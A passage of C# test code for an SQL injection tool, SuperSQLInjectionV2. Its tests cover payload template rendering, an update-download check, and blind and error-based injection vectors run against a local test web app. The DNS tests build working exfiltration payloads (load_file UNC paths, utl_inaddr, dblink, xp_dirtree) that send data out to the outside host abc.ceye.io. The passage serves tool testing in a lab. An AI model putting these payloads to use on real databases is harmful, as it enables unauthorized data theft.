    //5. Access：UnionData裸where槽（旧模板where 1=2恒假bug已修）；count带where
    PayloadFactory.Init(DBType.Access);
    string aUn = PayloadFactory.BPTool.UnionData(new DumpDataParam(new List<string> { "id", "name" }, "", "users", 3, 2) { Where = "id>5" });
    Check(aUn.Contains("from users where id>5"), "Access UnionData带where", aUn);
    string aCnt = PayloadFactory.BPTool.GetDataCount("", "users", "id>5");
    Check(aCnt.Contains("where id>5"), "Access count带where", aCnt);

    //6. SQLite：limit offset模板带where
    PayloadFactory.Init(DBType.SQLite);
    string lDv = PayloadFactory.BPTool.DataValue(new DumpDataParam(new List<string> { "id" }, "", "t", 1, 1) { Where = "id>5" });
    Check(lDv.Contains("from t where id>5") && lDv.Contains("limit 1 offset"), "SQLite带where", lDv);

    Console.WriteLine($"===== dump过滤自检结果: PASS={pass} FAIL={fail} =====");
}

// where=3 参数替换 vector 取数链路自检（prefixQuery/suffixQuery 的 WHERE.REPLACE 语义）
/// <summary>
/// 更新闭环活体测试（走软件自带的 UpdateManager 真实链路）：
/// AES令牌生成→检查更新→清单解析（源生成JSON）→逐文件下载→SHA256校验。
/// 环境变量：UPDATE_TEST_VERSION=模拟当前版本（默认1.9.9，低于已发布版以触发hasUpdate）；
/// UPDATE_TEST_MAXFILES=限制下载文件数（默认0=全量）；UPDATE_SERVER/UPDATE_APPID可覆盖目标。
/// </summary>
static async Task UpdateLoopTest()
{
    Console.WriteLine("===== 更新闭环活体测试（SoftUpdate） =====");
    string server = Environment.GetEnvironmentVariable("UPDATE_SERVER") ?? "http://soft.shack2.cn";
    string appId = Environment.GetEnvironmentVariable("UPDATE_APPID") ?? "supersqlinjection";
    string curVer = Environment.GetEnvironmentVariable("UPDATE_TEST_VERSION") ?? "1.9.9";
    int maxFiles = int.TryParse(Environment.GetEnvironmentVariable("UPDATE_TEST_MAXFILES"), out int mf) ? mf : 0;
    string staging = Path.Combine(Path.GetTempPath(), "supersqli-update-test");
    try { Directory.Delete(staging, true); } catch { }

    var cfg = new AppConfig();
    using var manager = new SuperSQLInjectionV2.Tools.Update.UpdateManager(
        new SuperSQLInjectionV2.Tools.Update.UpdateManagerOptions
        {
            ServerUrl = server,
            AppId = appId,
            Channel = "stable",
            ClientAuthKey = cfg.UpdateAuthKey,
            InstallDir = staging
        });

    //1 检查更新
    SuperSQLInjectionV2.Tools.Update.CheckUpdateResponse check;
    try
    {
        check = await manager.CheckForUpdatesAsync(curVer);
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[FAIL] 检查更新请求异常: {ex.GetType().Name}: {ex.Message}");
        Console.WriteLine($"########## [update] 结果: FAIL(请求异常) ##########");
        return;
    }
    Console.WriteLine($"[{(check.HasUpdate ? "PASS" : "FAIL")}] 检查更新 hasUpdate={check.HasUpdate} version={check.Manifest?.Version} mandatory={check.Mandatory} msg={check.Message}");
    if (!check.HasUpdate || check.Manifest == null)
    {
        //否定路径：服务端明确告知"已是最新"也算链路正常（令牌/解析/语义比较均工作）
        bool negOk = check.Manifest == null && (check.Message ?? "").Contains("最新");
        Console.WriteLine($"########## [update] 结果: {(negOk ? "PASS(无更新-已是最新)" : "FAIL(服务端无更新或令牌被拒)")} ##########");
        return;
    }
    var manifest = check.Manifest;
    long totalMB = manifest.Files.Sum(f => f.Size) / 1024 / 1024;
    Console.WriteLine($"      清单: version={manifest.Version} os={manifest.Os ?? "通用"} arch={manifest.Arch ?? "通用"} files={manifest.Files.Count} 总计={totalMB}MB");
    bool filesOk = manifest.Files.Count > 0 && manifest.Files.All(f => f.Size > 0 && f.Sha256?.Length == 64 && !string.IsNullOrEmpty(f.Path));
    Console.WriteLine($"[{(filesOk ? "PASS" : "FAIL")}] 清单完整性（每文件含size+sha256）");

    //2 下载zip包+SHA256校验（DownloadUpdateAsync 单包模式，失败即抛异常）
    var sw = System.Diagnostics.Stopwatch.StartNew();
    int lastPct = -1;
    string packagePath;
    try
    {
        packagePath = await manager.DownloadUpdateAsync(manifest, new Progress<SuperSQLInjectionV2.Tools.Update.UpdateProgress>(p =>
        {
            int pct = (int)p.Percent;
            if (pct / 10 != lastPct / 10)
            {
                lastPct = pct;
                Console.WriteLine($"      下载中 {pct}%（{p.TransferredBytes / 1024}KB/{p.TotalBytes / 1024}KB）");
            }
        }));
        sw.Stop();
        Console.WriteLine($"[PASS] 下载+SHA256校验更新包，耗时 {sw.Elapsed.TotalSeconds:F1}s");
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[FAIL] 下载/校验异常: {ex.Message}");
        Console.WriteLine($"########## [update] 结果: FAIL(下载校验失败) ##########");
        return;
    }

    //3 抽查落盘包存在性
    bool exists = File.Exists(packagePath) && new FileInfo(packagePath).Length == manifest.Files[0].Size;
    Console.WriteLine($"[{(exists ? "PASS" : "FAIL")}] 落盘抽查 {Path.GetFileName(packagePath)} size={manifest.Files[0].Size}");
    Console.WriteLine($"########## [update] 结果: {(exists ? "PASS" : "FAIL")} ##########");
}

static void VectorTest()
{
    Console.WriteLine("===== where=3 vector取数自检 =====");
    int pass = 0, fail = 0;
    void Check(bool ok, string name, string actual = null)
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}");
        if (!ok && actual != null) Console.WriteLine($"      actual=[{actual}]");
        if (ok) pass++; else fail++;
    }

    //1. PayloadPlaceholder 剥离"!"前缀（!SLEEP→SLEEP），不误伤!=比较符
    var ph = new PayloadPlaceholder(3);
    string r1 = ph.Replace("ELT([INFERENCE],!SLEEP([SLEEPTIME]))");
    Check(r1 == "ELT([INFERENCE],SLEEP(3))", "!SLEEP前缀剥离+SLEEPTIME渲染", r1);
    string r2 = ph.Replace("1!=2 AND ![RANDNUM]");
    Check(r2.StartsWith("1!=2 AND !"), "!=比较符与非法!保留", r2);

    //2. DataConfig.IsVectorMode/ResetVectorMode 语义
    var dc = new DataConfig { Where = 3, VectorTemplate = "ELT([INFERENCE],1)" };
    bool okMode = dc.IsVectorMode;
    dc.ResetVectorMode();
    Check(okMode && !dc.IsVectorMode && dc.Where == 1 && dc.VectorTemplate == "", "IsVectorMode判定与复位");

    //3. 反射调用私有 ExploitMarkedValue：where=3布尔vector烘焙（无and胶水/无boundary前后缀/按库注释）
    Type ctxType = typeof(InjectDetectEngine).GetNestedType("Ctx", System.Reflection.BindingFlags.NonPublic);
    object ctx = Activator.CreateInstance(ctxType, true);
    ctxType.GetField("PValue").SetValue(ctx, "1");
    var m = typeof(InjectDetectEngine).GetMethod("ExploitMarkedValue",
        System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
    string boolVector = "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))";
    string baked = (string)m.Invoke(null, new object[] { ctx, "", "'", "' ", DBType.MySQL, 3, boolVector, ph });
    Check(baked.Contains("CASE WHEN ($sql$)") && baked.Contains("THEN 1") && baked.EndsWith("#</Encode>")
        && !baked.Contains(" and ") && !baked.StartsWith("'"), "where=3布尔vector烘焙（[INFERENCE]槽+[ORIGVALUE]+MySQL注释）", baked);

    //4. where=3报错vector烘焙（[QUERY]槽+定界符渲染）
    string errVector = "EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))";
    string bakedErr = (string)m.Invoke(null, new object[] { ctx, "", "", "", DBType.MySQL, 3, errVector, ph });
    Check(bakedErr.Contains("($sql$)") && bakedErr.Contains("0x") && !bakedErr.Contains(" and "),
        "where=3报错vector烘焙（[QUERY]槽+hex定界符）", bakedErr);

    //5. where=1走and胶水路径（回归保护）
    string glue = (string)m.Invoke(null, new object[] { ctx, "1", "'", "", DBType.MySQL, 1, "", ph });
    Check(glue == "1<Encode>' and $sql$#</Encode>", "where=1保持and胶水路径", glue);

    //6. where=3但vector无取数槽位：回退and胶水路径
    string fallback = (string)m.Invoke(null, new object[] { ctx, "", "'", "", DBType.MySQL, 3, "(SELECT 1)", ph });
    Check(fallback == "<Encode>' and $sql$#</Encode>", "where=3无槽vector回退胶水", fallback);

    Console.WriteLine($"===== vector自检结果: PASS={pass} FAIL={fail} =====");
}

// where=3 vector取数活体验证：手工构造vector烘焙标记报文，对TestWebApp(5099) MySQL数字点走盲注/报错两条vector链路取version
static async Task VectorLiveTest()
{
    Console.WriteLine("===== where=3 vector取数活体验证（MySQL@5099）=====");
    int pass = 0, fail = 0;

    AppConfig NewConfig(string markedReq)
    {
        var config = new AppConfig();
        Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
        config.Host = "127.0.0.1";
        config.Port = int.TryParse(Environment.GetEnvironmentVariable("SQLI_TARGET_PORT"), out var p) ? p : twaPort;
        config.IsSSL = false;
        config.TimeOut = 15;
        config.RequestTxt = markedReq;
        config.DataConfig.SelectedDBType = DBType.MySQL;
        config.DataConfig.Where = 3;
        config.DataConfig.OrigValue = "1";
        return config;
    }

    //1. 布尔vector链路：(CASE WHEN (cond) THEN 1 ELSE (SELECT n1 UNION SELECT n2) END) —— 真=id=1页，假=子查询多行报错页
    {
        string req = "GET /num?db=mysql&id=<Encode>(SELECT (CASE WHEN ($sql$) THEN 1 ELSE (SELECT 43721 UNION SELECT 89012) END))#</Encode> HTTP/1.1\r\n" +
                     $"Host: 127.0.0.1:{twaPort}\r\nUser-Agent: TestHarness\r\nAccept: */*\r\nConnection: close\r\n\r\n";
        var config = NewConfig(req);
        config.DataConfig.SelectedInjectType = InjectType.Blind;
        config.DataConfig.SelectBoolInject = BoolInjectType.KeyWord;
        config.DataConfig.CheckValue = "达梦与人大金仓在政企市场持续增长";
        config.DataConfig.VectorTemplate = "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))";
        PayloadFactory.Init(DBType.MySQL);
        string v = await DataComm.GetStringByBool(config, "version()", 64);
        bool ok = v.StartsWith("5.7") || v.StartsWith("8.0"); //mysql57/mysql80容器均可
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] 布尔vector盲注取version() = [{v}]");
        if (ok) pass++; else fail++;
    }

    //2. 报错vector链路：updatexml替换形态vector（MySQL 5.7下EXP/JSON_KEYS报错不回显求值结果，同为该限制；
    //   updatexml是5.7可用触发函数）——vector自带触发函数，payload只做ConcatData标记包装进[QUERY]槽位
    {
        string req = "GET /num?db=mysql&id=<Encode>UPDATEXML(1,CONCAT(0x7e,($sql$),0x7e),1)#</Encode> HTTP/1.1\r\n" +
                     $"Host: 127.0.0.1:{twaPort}\r\nUser-Agent: TestHarness\r\nAccept: */*\r\nConnection: close\r\n\r\n";
        var config = NewConfig(req);
        config.DataConfig.SelectedInjectType = InjectType.Error;
        config.DataConfig.VectorTemplate = "UPDATEXML(1,CONCAT(0x7e,([QUERY]),0x7e),1)";
        PayloadFactory.Init(DBType.MySQL);
        string v = await DataComm.DataDumpWithError(config, "version()");
        bool ok = v.StartsWith("5.7") || v.StartsWith("8.0"); //mysql57/mysql80容器均可
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] 报错vector取version() = [{v}]");
        if (ok) pass++; else fail++;
    }

    Console.WriteLine($"===== vector活体验证结果: PASS={pass} FAIL={fail} =====");
}

// A3 DNS外带 payload 拼接自检（无公网DNSLog域名，验证各库外带表达式构造正确性）
// P2-8 自建DNS接收端自检：真实UDP DNS报文 → 记录 → ceye JSON → 现有回收解析链路 → hex解码还原
static async Task DnsServerTest()
{
    Console.WriteLine("===== P2-8 自建DNS接收端自检 =====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    //构造DNS查询报文（标准query：12字节头+question）
    static byte[] BuildDnsQuery(string qname, ushort id)
    {
        var ms = new MemoryStream();
        void W16(ushort v) { ms.WriteByte((byte)(v >> 8)); ms.WriteByte((byte)(v & 0xff)); }
        W16(id); W16(0x0100); W16(1); W16(0); W16(0); W16(0); //RD=1, QD=1
        foreach (string label in qname.Split('.'))
        {
            ms.WriteByte((byte)label.Length);
            foreach (char c in label) ms.WriteByte((byte)c);
        }
        ms.WriteByte(0);
        W16(1); W16(1); //A/IN
        return ms.ToArray();
    }

    int port = 15353;
    string zone = "test.dns";
    var server = new SuperSQLInjectionV2.Tools.Dns.DnsLogServerCore { ZoneDomain = zone, Logger = _ => { } };
    server.Start(port);
    try
    {
        using var udp = new System.Net.Sockets.UdpClient();
        udp.Client.ReceiveTimeout = 5000;
        var ep = new System.Net.IPEndPoint(System.Net.IPAddress.Loopback, port);

        //1.区内查询：i1.61626364.test.dns（"abcd"的hex）
        udp.Send(BuildDnsQuery("i1.61626364.test.dns", 0x1234), ep);
        var respEp = new System.Net.IPEndPoint(System.Net.IPAddress.Any, 0);
        byte[] resp = udp.Receive(ref respEp);
        bool answered = resp.Length > 12 && (resp[2] & 0x80) != 0 && resp[7] == 1;
        Check("DNS查询收到A记录应答", answered, $"len={resp.Length} an={(resp.Length > 7 ? resp[7] : -1)}");

        //2.区外查询不应入记录（但应有应答）
        udp.Send(BuildDnsQuery("www.example.com", 0x1235), ep);
        udp.Receive(ref respEp);
        //3.检测token形态：tok9527.test.dns
        udp.Send(BuildDnsQuery("tok9527.test.dns", 0x1236), ep);
        udp.Receive(ref respEp);

        await Task.Delay(300); //收包循环异步落记录
        var snap = server.Snapshot();
        Check("区内记录已入存储（2条）", snap.Count == 2,
            string.Join(",", snap.Select(r => r.Name)));
        Check("区外查询不入记录", snap.All(r => r.Name.EndsWith(zone)));

        //4.ceye JSON 导出 + 现有取数解析链路零改动复用
        string json = server.ToCeyeJson(zone);
        var seg = new SortedDictionary<int, string>();
        SuperSQLInjectionV2.Models.Data.DnsExfilTool.ParseCeyeRecords(json, zone, seg);
        Check("回收解析出i1段hex", seg.Count == 1 && seg[1] == "61626364");
        Check("hex解码还原数据", seg.Count == 1 && TextCodec.unHex(seg[1], "UTF-8") == "abcd");

        //5.检测token回收链路
        var tokens = new HashSet<string> { "tok9527", "tok0000" };
        var hits = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var m = typeof(SuperSQLInjectionV2.Models.Data.DnsExfilTool).GetMethod("CollectTokenHits",
            System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
        m!.Invoke(null, new object[] { json, "." + zone, tokens, hits });
        Check("检测token命中回收", hits.Contains("tok9527") && !hits.Contains("tok0000"));

        //6.0x20大小写混淆的qname（部分解析器随机化大小写）仍命中区内
        server.Clear();
        udp.Send(BuildDnsQuery("I1.61626364.TeSt.DNS", 0x1237), ep);
        udp.Receive(ref respEp);
        await Task.Delay(200);
        Check("大小写混淆查询规范化入区", server.Snapshot().Any(r => r.Name == "i1.61626364.test.dns"));
    }
    finally
    {
        server.Stop();
    }

    //7.主程序内嵌管理器：EnableState启停 + CollectFromDnsLog本机通道端到端
    var config = new AppConfig();
    config.DataConfig.DnsLogDomain = zone;
    config.DataConfig.DnsServerEnable = true;
    config.DataConfig.DnsServerPort = 15354;
    config.DataConfig.DbEncoding = "UTF-8";
    config.DataConfig.SelectedDBType = DBType.MySQL;
    config.TimeOut = 5;
    bool started = SuperSQLInjectionV2.Models.Data.DnsServerManager.EnsureState(config);
    Check("DnsServerManager按配置启动", started && SuperSQLInjectionV2.Models.Data.DnsServerManager.Current != null,
        SuperSQLInjectionV2.Models.Data.DnsServerManager.Current == null ? config.DataConfig.DnsServerStatus : "running");
    if (started)
    {
        try
        {
            SuperSQLInjectionV2.Models.Data.DnsServerManager.Current!.Clear();
            using var udp2 = new System.Net.Sockets.UdpClient();
            var ep2 = new System.Net.IPEndPoint(System.Net.IPAddress.Loopback, 15354);
            udp2.Send(BuildDnsQuery("i1.61626364." + zone, 0x2222), ep2);
            await Task.Delay(300);
            //本机通道：不配Token/API也应回收到数据
            string got = await SuperSQLInjectionV2.Models.Data.DnsExfilTool.CollectFromDnsLog(config, 1, 5);
            Check("CollectFromDnsLog本机通道回收解码", got == "abcd", got);
        }
        finally
        {
            SuperSQLInjectionV2.Models.Data.DnsServerManager.Shutdown();
        }
    }

    Console.WriteLine($"===== P2-8自检结果: PASS={pass} FAIL={fail} =====");
}

static void DnsTest()
{
    Console.WriteLine("===== A3 DNS外带payload自检 =====");
    string domain = "abc.ceye.io";
    string expr = "version()";
    int pass = 0, fail = 0;

    //MySQL：load_file + concat UNC + hex(substr(...))
    string my = SuperSQLInjectionV2.Models.Data.DnsExfilTool.BuildSegPayload(DBType.MySQL, expr, 2, domain);
    bool ok1 = my.Contains("load_file(concat('\\\\\\\\','i2.',hex(substr((version()),49,48)),'.abc.ceye.io','\\\\x'))");
    Console.WriteLine($"[{(ok1 ? "PASS" : "FAIL")}] MySQL: {my}");
    if (ok1) pass++; else fail++;

    //Oracle/DM：utl_inaddr + rawtohex
    string orc = SuperSQLInjectionV2.Models.Data.DnsExfilTool.BuildSegPayload(DBType.Oracle, expr, 1, domain);
    bool ok2 = orc.Contains("utl_inaddr.get_host_address('i1.'||rawtohex(utl_raw.cast_to_raw(substr((version()),1,48)))||'.abc.ceye.io')");
    Console.WriteLine($"[{(ok2 ? "PASS" : "FAIL")}] Oracle/DM: {orc}");
    if (ok2) pass++; else fail++;

    //PG/Kingbase：dblink
    string pg = SuperSQLInjectionV2.Models.Data.DnsExfilTool.BuildSegPayload(DBType.PostgreSQL, expr, 1, domain);
    bool ok3 = pg.Contains("dblink('host=i1.'||encode(substr((version()),1,48)::bytea,'hex')||'.abc.ceye.io");
    Console.WriteLine($"[{(ok3 ? "PASS" : "FAIL")}] PG/Kingbase: {pg}");
    if (ok3) pass++; else fail++;

    //SQLServer：堆叠 xp_dirtree
    string ms = SuperSQLInjectionV2.Models.Data.DnsExfilTool.BuildSegPayload(DBType.SQLServer, "@@version", 1, domain);
    bool ok4 = ms.StartsWith(";declare @d") && ms.Contains("xp_dirtree '\\\\'+@d+'\\x'--") && ms.Contains(".abc.ceye.io");
    Console.WriteLine($"[{(ok4 ? "PASS" : "FAIL")}] SQLServer: {ms}");
    if (ok4) pass++; else fail++;

    //段序号偏移：第3段起始位置=(3-1)*48+1=97
    string my3 = SuperSQLInjectionV2.Models.Data.DnsExfilTool.BuildSegPayload(DBType.MySQL, expr, 3, domain);
    bool ok5 = my3.Contains(",97,48") && my3.Contains("'i3.'");
    Console.WriteLine($"[{(ok5 ? "PASS" : "FAIL")}] 分段偏移(第3段): {my3}");
    if (ok5) pass++; else fail++;

    //ceye记录解析：按i序号排序拼接hex、忽略非hex标签与异域名记录、重复段去重
    string json = "{\"meta\":{\"code\":200},\"data\":["
        + "{\"name\":\"i2.6f6e.abc.ceye.io\"},"
        + "{\"name\":\"i1.4a4b.abc.ceye.io\"},"
        + "{\"name\":\"i1.4a4b.abc.ceye.io\"},"
        + "{\"name\":\"i9.zz.abc.ceye.io\"},"
        + "{\"name\":\"i1.FFFF.other.ceye.io\"}]}";
    var seg = new System.Collections.Generic.SortedDictionary<int, string>();
    SuperSQLInjectionV2.Models.Data.DnsExfilTool.ParseCeyeRecords(json, domain, seg);
    bool ok6 = seg.Count == 2 && seg[1] == "4a4b" && seg[2] == "6f6e";
    Console.WriteLine($"[{(ok6 ? "PASS" : "FAIL")}] ceye记录解析（排序/去重/过滤）: count={seg.Count}");
    if (ok6) pass++; else fail++;

    //拼回hex可解码："JKon" -> 原始字符串
    string hexBack = seg.Count == 2 ? string.Concat(seg.Values) : "";
    bool ok7 = hexBack == "4a4b6f6e" && TextCodec.unHex(hexBack, "UTF-8") == "JKon";
    Console.WriteLine($"[{(ok7 ? "PASS" : "FAIL")}] hex拼回并unhex解码: {hexBack}");
    if (ok7) pass++; else fail++;

    //DNS盲注类型：HasDnsChannel能力表（支持6库+UnKnow，其余隐藏）
    bool ok8 = DbCapabilities.HasDnsChannel(DBType.MySQL) && DbCapabilities.HasDnsChannel(DBType.Oracle)
        && DbCapabilities.HasDnsChannel(DBType.DM) && DbCapabilities.HasDnsChannel(DBType.PostgreSQL)
        && DbCapabilities.HasDnsChannel(DBType.Kingbase) && DbCapabilities.HasDnsChannel(DBType.SQLServer)
        && DbCapabilities.HasDnsChannel(DBType.UnKnow)
        && !DbCapabilities.HasDnsChannel(DBType.SQLite) && !DbCapabilities.HasDnsChannel(DBType.H2)
        && !DbCapabilities.HasDnsChannel(DBType.HSQLDB) && !DbCapabilities.HasDnsChannel(DBType.DB2)
        && !DbCapabilities.HasDnsChannel(DBType.Access) && !DbCapabilities.HasDnsChannel(DBType.ClickHouse)
        && !DbCapabilities.HasDnsChannel(DBType.OpenGauss) && !DbCapabilities.HasDnsChannel(DBType.Informix);
    Console.WriteLine($"[{(ok8 ? "PASS" : "FAIL")}] HasDnsChannel能力表（6库+UnKnow支持）");
    if (ok8) pass++; else fail++;

    //IsSupported与BuildSegPayload分支一致：支持库非空、不支持库为空
    bool ok9 = SuperSQLInjectionV2.Models.Data.DnsExfilTool.IsSupported(DBType.MySQL)
        && SuperSQLInjectionV2.Models.Data.DnsExfilTool.IsSupported(DBType.DM)
        && !SuperSQLInjectionV2.Models.Data.DnsExfilTool.IsSupported(DBType.SQLite)
        && !SuperSQLInjectionV2.Models.Data.DnsExfilTool.IsSupported(DBType.OpenGauss)
        && SuperSQLInjectionV2.Models.Data.DnsExfilTool.BuildSegPayload(DBType.SQLite, expr, 1, domain) == "";
    Console.WriteLine($"[{(ok9 ? "PASS" : "FAIL")}] IsSupported与payload分支一致");
    if (ok9) pass++; else fail++;

    //注入类型选项：默认含Dns；切到无外带通道的库（SQLite）隐藏，切回MySQL恢复
    var dc = new SuperSQLInjectionV2.Models.DataConfig();
    bool listed0 = dc.InjectTypes.Contains(InjectType.Dns);
    dc.RefreshInjectTypes(DBType.SQLite);
    bool hiddenSqlite = !dc.InjectTypes.Contains(InjectType.Dns);
    dc.RefreshInjectTypes(DBType.MySQL);
    bool backMysql = dc.InjectTypes.Contains(InjectType.Dns);
    bool ok10 = listed0 && hiddenSqlite && backMysql;
    Console.WriteLine($"[{(ok10 ? "PASS" : "FAIL")}] 注入类型选项按库过滤Dns（默认含/SQLite隐藏/MySQL恢复）");
    if (ok10) pass++; else fail++;

    //注入记录类型描述：Dns显示为"DNS盲注"
    bool ok11 = new InjectRecord { InjectType = InjectType.Dns }.InjectTypeDesc == "DNS盲注";
    Console.WriteLine($"[{(ok11 ? "PASS" : "FAIL")}] InjectRecord描述：DNS盲注");
    if (ok11) pass++; else fail++;

    Console.WriteLine($"===== A3自检结果: PASS={pass} FAIL={fail} =====");
}

//取数模板热管理自检（不依赖Docker/靶场）：
//模拟"模板失效->修改->热生效->还原"完整链路，验证模板文件与PayloadFactory加载的一致性
static void TplTest()
{
    Console.WriteLine("===== 取数模板管理自检 =====");
    int pass = 0, fail = 0;
    string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory,
        BasePayload.GetTemplateRelativePath(DBType.MySQL));
    if (!File.Exists(path))
    {
        Console.WriteLine($"[FAIL] 模板文件不存在: {path}");
        return;
    }
    string original = File.ReadAllText(path);
    try
    {
        //1. 必需key完整性：mysql.txt必须包含全部RequiredKeys
        var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        foreach (var ln in File.ReadAllLines(path))
        {
            if (string.IsNullOrWhiteSpace(ln)) continue;
            int ci = ln.IndexOf(':');
            if (ci > 0) dict[ln.Substring(0, ci)] = ln.Substring(ci + 1);
        }
        //1b. 用途描述覆盖：mysql.txt全部key都应有登记的用途描述；未知key走扩展项兜底
        var noDesc = dict.Keys.Where(k => !BasePayload.KeyDescriptions.ContainsKey(k)).ToList();
        bool ok1b = noDesc.Count == 0;
        Console.WriteLine($"[{(ok1b ? "PASS" : "FAIL")}] 用途描述覆盖（未登记: {(ok1b ? "无" : string.Join(",", noDesc))}）");
        if (ok1b) pass++; else fail++;
        bool ok1c = BasePayload.GetKeyDescription("BoolData").Contains("布尔盲注")
                    && BasePayload.GetKeyDescription("some_custom_key").Contains("扩展项");
        Console.WriteLine($"[{(ok1c ? "PASS" : "FAIL")}] 描述查询（已登记key命中+未知key兜底）");
        if (ok1c) pass++; else fail++;
        var missing = BasePayload.RequiredKeys.Where(k => !dict.ContainsKey(k)).ToList();
        bool ok1 = missing.Count == 0;
        Console.WriteLine($"[{(ok1 ? "PASS" : "FAIL")}] 必需key完整性（缺失: {(ok1 ? "无" : string.Join(",", missing))}）");
        if (ok1) pass++; else fail++;

        //2. 修改ErrorData模板（floor(rand)失效场景->换成extractvalue），写回文件
        var lines = File.ReadAllLines(path).ToList();
        int idx = lines.FindIndex(l => l.StartsWith("ErrorData:", StringComparison.OrdinalIgnoreCase));
        bool ok2 = idx >= 0;
        Console.WriteLine($"[{(ok2 ? "PASS" : "FAIL")}] 定位ErrorData模板行（行号: {idx}）");
        if (ok2) pass++; else fail++;

        string newTpl = "extractvalue(1,concat(0x7e,(select ({cols})),0x7e))";
        lines[idx] = "ErrorData:" + newTpl;
        File.WriteAllLines(path, lines);

        //3. 热加载：重新Init后BasePayload必须读到新模板
        PayloadFactory.Init(DBType.MySQL);
        bool ok3 = PayloadFactory.BasePayload.ErrorData == newTpl;
        Console.WriteLine($"[{(ok3 ? "PASS" : "FAIL")}] 热加载新模板: {PayloadFactory.BasePayload.ErrorData}");
        if (ok3) pass++; else fail++;

        //4. BPTool按新模板拼接（模拟取数）
        string sql = PayloadFactory.BPTool.ErrorData("version()");
        bool ok4 = sql.Contains("extractvalue") && sql.Contains("version()");
        Console.WriteLine($"[{(ok4 ? "PASS" : "FAIL")}] 取数SQL按新模板拼接: {sql}");
        if (ok4) pass++; else fail++;
    }
    finally
    {
        //还原原始模板并热加载，避免污染真实模板
        File.WriteAllText(path, original);
        PayloadFactory.Init(DBType.MySQL);
        bool restored = PayloadFactory.BasePayload.ErrorData != null && original.Contains("ErrorData:" + PayloadFactory.BasePayload.ErrorData);
        Console.WriteLine($"[{(restored ? "PASS" : "FAIL")}] 模板已还原: {PayloadFactory.BasePayload.ErrorData}");
        if (restored) pass++; else fail++;
    }

    //5. Hash分流：取数模板中Hash/DBA类条目进HashItems（Hash读取选项卡），其余进环境变量
    var vers = new System.Collections.ObjectModel.ObservableCollection<VersModel>();
    var hash = new System.Collections.ObjectModel.ObservableCollection<VersModel>();
    SuperSQLInjectionV2.ViewModels.Tools.VersTools.ReadVersByDBType(DBType.MySQL, vers, hash);
    bool ok5 = hash.Any(h => h.Name.Contains("Hash")) && hash.Any(h => h.Name.Contains("DBA"))
        && !vers.Any(v => v.Name.Contains("Hash")) && vers.Count > 0;
    Console.WriteLine($"[{(ok5 ? "PASS" : "FAIL")}] Hash分流（HashItems={hash.Count}项[{string.Join(",", hash.Select(h => h.Name))}]，环境变量={vers.Count}项无Hash残留）");
    if (ok5) pass++; else fail++;

    Console.WriteLine($"===== 模板自检结果: PASS={pass} FAIL={fail} =====");
}

//请求报文格式转换自检（GET/POST表单/POST JSON/POST multipart 互转，不依赖靶场）
static void FmtTest()
{
    Console.WriteLine("===== 报文格式转换自检 =====");
    int pass = 0, fail = 0;
    void Check(string name, bool ok, string detail = "")
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}{(detail.Length > 0 ? ": " + detail : "")}");
        if (ok) pass++; else fail++;
    }

    string getReq = "GET /JVApp/mysql.jsp?id=1<*>&name=abc HTTP/1.1\r\nHost: 127.0.0.1:8090\r\nUser-Agent: test-ua\r\n\r\n";

    //1. GET -> POST表单：参数移入body，CT/CL正确，注入标记保留
    string postForm = RequestRewriter.ChangeRequestFormat(getReq, SuperSQLInjectionV2.Tools.Http.RequestFormat.POST_FORM);
    bool ok1 = postForm.StartsWith("POST /JVApp/mysql.jsp HTTP/1.1")
               && postForm.Contains("Content-Type: application/x-www-form-urlencoded")
               && postForm.EndsWith("id=1<*>&name=abc")
               && postForm.Contains($"Content-Length: {System.Text.Encoding.UTF8.GetByteCount("id=1<*>&name=abc")}")
               && postForm.Contains("Host: 127.0.0.1:8090");
    Check("GET->POST表单（参数移body+标记保留+CL正确）", ok1);

    //2. POST表单 -> GET：参数回query，无body相关头
    string backGet = RequestRewriter.ChangeRequestFormat(postForm, SuperSQLInjectionV2.Tools.Http.RequestFormat.GET);
    bool ok2 = backGet.StartsWith("GET /JVApp/mysql.jsp?id=1<*>&name=abc HTTP/1.1")
               && !backGet.Contains("Content-Type") && !backGet.Contains("Content-Length")
               && backGet.TrimEnd().EndsWith("test-ua");
    Check("POST表单->GET（参数回query+清理body头）", ok2);

    //3. GET -> POST JSON：body为合法JSON且值原样（标记不编码）
    string postJson = RequestRewriter.ChangeRequestFormat(getReq, SuperSQLInjectionV2.Tools.Http.RequestFormat.POST_JSON);
    bool jsonOk = false;
    try
    {
        using var doc = System.Text.Json.JsonDocument.Parse(postJson.Substring(postJson.IndexOf("\r\n\r\n") + 4));
        jsonOk = doc.RootElement.GetProperty("id").GetString() == "1<*>"
                 && doc.RootElement.GetProperty("name").GetString() == "abc";
    }
    catch { }
    Check("GET->POST JSON（合法JSON+值原样保留标记）", jsonOk && postJson.Contains("Content-Type: application/json") && postJson.Contains("\"id\":\"1<*>\""), postJson.Split("\r\n\r\n").Last());

    //4. POST JSON -> POST multipart：边界/字段齐全，CL正确
    string multi = RequestRewriter.ChangeRequestFormat(postJson, SuperSQLInjectionV2.Tools.Http.RequestFormat.POST_MULTIPART);
    var mct = System.Text.RegularExpressions.Regex.Match(multi, "boundary=([^\r\n;]+)");
    string boundary = mct.Success ? mct.Groups[1].Value : "";
    string multiBody = multi.Substring(multi.IndexOf("\r\n\r\n") + 4);
